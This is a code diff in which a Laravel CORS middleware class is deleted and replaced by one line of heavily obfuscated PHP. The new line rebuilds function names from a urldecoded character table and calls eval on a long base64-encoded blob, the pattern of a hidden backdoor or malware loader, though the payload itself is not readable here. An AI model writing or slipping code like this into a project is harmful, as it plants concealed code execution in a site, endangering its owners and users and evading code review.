@@ -1,34 +1,3 @@
-<?php
-
-namespace App\Http\Middleware;
-
-use Closure;
-
-class CrossHttp
-{
-    /**
-     * Handle an incoming request.
-     *
-     * @param  \Illuminate\Http\Request $request
-     * @param  \Closure $next
-     * @return mixed
-     */
-    public function handle($request, Closure $next)
-    {
-
-        $response = $next($request);
-
-        $host = isset($_SERVER['HTTP_ORIGIN'])?$_SERVER['HTTP_ORIGIN']:"";
-        $allowHost = explode(',', getenv("ALLOW_ORIGIN_HOST"));
-        if( $host && in_array($host, $allowHost))
-        {
-            $response->headers->set('Access-Control-Allow-Origin', $host);
-            $response->headers->set('Access-Control-Allow-Headers', 'Origin, Content-Type, Access-Token, Cookie, Accept, multipart/form-data');
-            $response->headers->set('Access-Control-Allow-Headers', 'Origin, Content-Type, Cookie, Accept');
-            $response->headers->set('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, OPTIONS');
-            $response->headers->set('Access-Control-Allow-Credentials', 'true');
-        }
-
-        return $response;
-    }
-}
+<?php 
+$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iS0h6dHJ1ZlVYT0RjSnNwaVl4VmxFeW5nTGpSV052Q2tUTUliYVFkd2VtaEdBUFpvRkJTcUVScm9uWFFPSWZ4ZUpNTEhTQUZQWXBkRGJCYWtpanN6dFpXdW13VEtnTnZVaFZ5bENHcWNWeDlLbVJoRXNONXZ1a0ZyZVVDQnlxR0dlUkdlcVJhMGVDQWlta2F6dVVGM1NJSlBmS2xFVElpUFdZaU11M2kxZU5PN3NETEJ1VUNyZXBHeGVOOXJlMHYwVFJoRWdLbERXc2hEYnBsY3NIaERXc2hERUhHV1NrNXp1VU9EU2s0RG1rNUJ1MjFMdU5lRGVORkFUa0ZyVHM0RVdzaERXc2hjc0hoRFdzaERFSEdoZVVDcFNrMERXQ0FKdVVBMXVrUFhTSWFQSVl2MFRSR2VPTkZBVGtGclRzaHplTkZBVGtGclRobERXc2hEV3NsRHdSR3ZlTkNvV3NHZXcyQWplM0ZweXFoenVORjRUaGxEV3NoRFdzbER3UkpQVFJGcHVIR29tSXZQeWhsRFdzaERXc2xqc0hoRFdzR0tUa0pNbWtaRHlkRlhTM2FMdTI0RG1VQ1h5VUFQRXNhcHlJQzF5SWkwYnNHeHVVOXJUSUpQV3NhWHlJdjBFd2xEV3NoRGdLbEVXc2hEV3NoRFdzaHplTkZyZVU5WGUyT0RWcWh6dU5GNFRzRHplTkZBVGtGclRzejdzRGxEV3NoRFdzaERXc2FsdTNpMFd4MERtSWlyeUl3bEpDOXRhRkprYUZKdUowdk9GQ0dRdDFKSmEwUGZKMTBMVnBhUU8wRnFGekZxa3BUV0ZDYXdJMDlxcU9USnRIVFRmSFdIZktsRFdzaERXc2hEV3NhdnVVQWpUMHZqZTN3RFZxR1BnUkdNdTJhUEVzZU1KcEtEeTJGMHlrNTJFc0pHdFlBVkYxOVZPelBScU81UXFZOXRGc1dMRXRNRVdzaERXc2hEV3NHTHlIRERKVXZqZTN3REpIU0RtazVRU0lKcFNJemxKVXZqZTN3TVdzYXZ1VUFqVDB2amUzd0xFd2xEV3NoRFdzaERXUk1FV3NoRFdzaERXc2hEV3NoREpSSlBlM0dqdWRpUGJ0NWx5a0N6eUlKcmJ0NXJ5SXdsSjBDQlMyRnJlcDF4dTI1MGVOOU1iT0NNdVU5M2JPOXBta1RMdUhlTVdzYWx1M2kwRXRNRVdzaERXc2hEV3NoRFdzaERKUkpQZTNHanVkaVBidDVseWtDenlJSnJidDVyeUl3bEowQ0JTMkZyZXAxeHUyNTBlTjlNYk9DTXVVOTNiT3ZQU2thUGVkWmRic2hkdDNKTHkyUFhic0d4dTI1MHlrNTBiRmE1ZVVPTVdZQ0JTMkZyZXAxT3Uyb1B1SEtEdzI5am0yUFBic0dHUzJpUGVSd01XVTExdVJhTGVVQ3BUczlOdTNKb2JrYXZUVVlkRXRNRVdzaERXc2hEV3NoRFdzaERKUkpQZTNHanVkaVBidDVseWtDenlJSnJidDVyeUl3bEowQ0JTMkZyZXAxeHUyNTBlTjlNYk9DTXVVOTNiT3ZQU2thUGVkWmRic2hkdDNKTHkyUFhic0d4dTI1MHlrNTBiRmE1ZVVPTVdZaWp1Mm9MeXFLRHdraUJ5SUcwSnB6N3NIaERXc2hEV3NoRFdzaERXc2FweUlpS3UyNXJ5cTArbVVGdnlVRnBlcDArZTJGMEVzVEdTMmlQZTNab3cyOVhUUkpqdXMxR3VVQWpUcDFpeUlhbHUyYXJKcEtESjBUQ0ZzS0RPWTl0RnNLRE9ZQ093MERNV0NHRkZzS0R0MUdPcU85Zk9wZUxmS2xEV3NoRFdzaERXc2hEV3NoemVORnJlVTlYZTJPb1ZOdlBTa2FQZWRab1ZkaVBUc0Rkd2tpQnlJaXJiT2lqdWRhcHUyS293a0FNdTNlb3czSlB5VUZYVFVQdnVSWmRic2hkVFJKMXlxZUxmS2xEV3NoRFdzaERXUjBFc0hoRFdzaERXc2hEZU5GMFRJSlhXc2FweUlpS3UyNXJ5dE1FV3NoRFdSMEVRd2w9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
+ ?>
